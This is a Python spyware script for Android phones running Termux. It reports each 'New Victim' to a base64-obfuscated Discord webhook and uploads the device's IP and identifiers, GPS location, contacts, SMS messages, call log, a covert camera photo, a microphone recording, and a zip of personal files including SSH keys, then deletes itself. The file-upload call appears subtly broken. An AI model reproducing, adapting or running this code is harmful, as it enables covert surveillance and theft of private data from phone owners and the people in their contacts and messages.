#!/usr/bin/env python3
import os, sys, json, subprocess, time, shutil, glob, base64, urllib.request
from pathlib import Path

# ============================================================
# CONFIGURATION - REPLACE WITH YOUR ENCODED WEBHOOK
# ============================================================
ENC_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzUyMzgyNTk0NjcyNjQ0MC8yZk1EUnphUHZXOHMxOU91V1RKUkhUbzZ2anNHWExFb2c0ZUlwVWJZU192bWxnOWUyV3pZUkdaWWtmcFVqYS1hbHpwVg=="
# ============================================================

WEBHOOK_URL = base64.b64decode(ENC_WEBHOOK).decode()
TMP_DIR = f"/tmp/payload_{os.getpid()}"
os.makedirs(TMP_DIR, exist_ok=True)

def log(msg):
    with open(f"{TMP_DIR}/debug.log", "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")

def send_discord(content=None, file_path=None):
    try:
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, method="POST"), files=files)
        elif content:
            data = json.dumps({"content": content[:2000]}).encode()
            req = urllib.request.Request(WEBHOOK_URL, data=data, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req)
    except Exception as e:
        log(f"send_discord error: {e}")

def run_cmd(cmd, capture=True):
    try:
        if capture:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return r.stdout + r.stderr
        else:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            return ""
    except:
        return ""

def install_termux_api():
    log("Installing termux-api package...")
    run_cmd("pkg update -y", False)
    run_cmd("pkg install termux-api -y", False)
    if not os.path.exists("/data/data/com.termux/files/usr/bin/termux-battery-status"):
        apk_path = f"{TMP_DIR}/termux-api.apk"
        run_cmd(f"curl -L -o {apk_path} https://github.com/termux/termux-api/releases/download/v0.53.0/termux-api-app_v0.53.0+github.debug.apk", False)
        if os.path.exists(apk_path):
            run_cmd(f"termux-open {apk_path}", False)
            time.sleep(3)
    run_cmd("termux-setup-storage", False)
    time.sleep(2)

def get_device_info():
    info = {
        "hostname": os.uname().nodename,
        "user": os.getenv("USER"),
        "cwd": os.getcwd(),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ip": run_cmd("curl -s http://api.ipify.org || echo 'N/A'").strip(),
        "os": f"{os.uname().sysname} {os.uname().release}",
        "android_id": run_cmd("settings get secure android_id 2>/dev/null || echo 'N/A'").strip(),
        "model": run_cmd("getprop ro.product.model 2>/dev/null || echo 'N/A'").strip(),
        "manufacturer": run_cmd("getprop ro.product.manufacturer 2>/dev/null || echo 'N/A'").strip(),
        "sdk": run_cmd("getprop ro.build.version.sdk 2>/dev/null || echo 'N/A'").strip(),
    }
    return info

def collect_files():
    files = []
    targets = [
        "/sdcard/DCIM",
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/Pictures",
        "/sdcard/Music",
        "/sdcard/Movies",
        os.path.expanduser("~/storage/shared"),
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.termux"),
    ]
    for target in targets:
        if os.path.exists(target):
            for root, dirs, _ in os.walk(target):
                if any(skip in root for skip in ["cache", ".thumbnails", "Android/data"]):
                    continue
                for f in glob.glob(f"{root}/*"):
                    try:
                        if os.path.isfile(f) and os.path.getsize(f) < 5*1024*1024:
                            files.append(f)
                            if len(files) >= 100:
                                return files
                    except:
                        pass
    return files

def main():
    log("Payload started")
    install_termux_api()
    info = get_device_info()
    send_discord(f"**New Victim**\n```json\n{json.dumps(info, indent=2)}\n```")

    # Battery
    batt = run_cmd("termux-battery-status 2>/dev/null || echo 'N/A'")
    send_discord(f"**Battery**\n```\n{batt[:1500]}\n```")

    # Location
    loc = run_cmd("termux-location -p gps -f once 2>/dev/null || termux-location -p network -f once 2>/dev/null || echo 'N/A'")
    send_discord(f"**Location**\n```\n{loc[:1500]}\n```")

    # Contacts
    contacts = run_cmd("termux-contact-list 2>/dev/null | head -c 3000 || echo 'N/A'")
    send_discord(f"**Contacts**\n```json\n{contacts}\n```")

    # SMS (last 50)
    sms = run_cmd("termux-sms-list -l 50 2>/dev/null | head -c 3000 || echo 'N/A'")
    send_discord(f"**SMS (last 50)**\n```json\n{sms}\n```")

    # Call log (last 50)
    calls = run_cmd("termux-call-log -l 50 2>/dev/null | head -c 3000 || echo 'N/A'")
    send_discord(f"**Call Log (last 50)**\n```json\n{calls}\n```")

    # Camera photo
    photo_path = f"{TMP_DIR}/camera_photo.jpg"
    run_cmd(f"termux-camera-photo -c 0 {photo_path} 2>/dev/null", False)
    time.sleep(2)
    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
        send_discord("📸 Camera photo", photo_path)

    # Microphone recording (5s)
    audio_path = f"{TMP_DIR}/mic_recording.amr"
    run_cmd(f"termux-microphone-record -d 5 -f {audio_path} 2>/dev/null", False)
    time.sleep(6)
    if os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
        send_discord("🎤 Microphone recording (5s)", audio_path)

    # Files
    files = collect_files()
    if files:
        zip_path = f"{TMP_DIR}/files.zip"
        try:
            import zipfile
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in files[:50]:
                    try:
                        zf.write(f, os.path.basename(f))
                    except:
                        pass
            if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
                send_discord(f"📁 Files ({len(files)} files, max 50 in zip)", zip_path)
        except:
            pass

    # Self-destruct
    send_discord("💀 Payload completed. Self-destructing.")
    try:
        shutil.rmtree(TMP_DIR, ignore_errors=True)
        os.remove(__file__)
    except:
        pass

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"Fatal error: {e}")
        sys.exit(0)
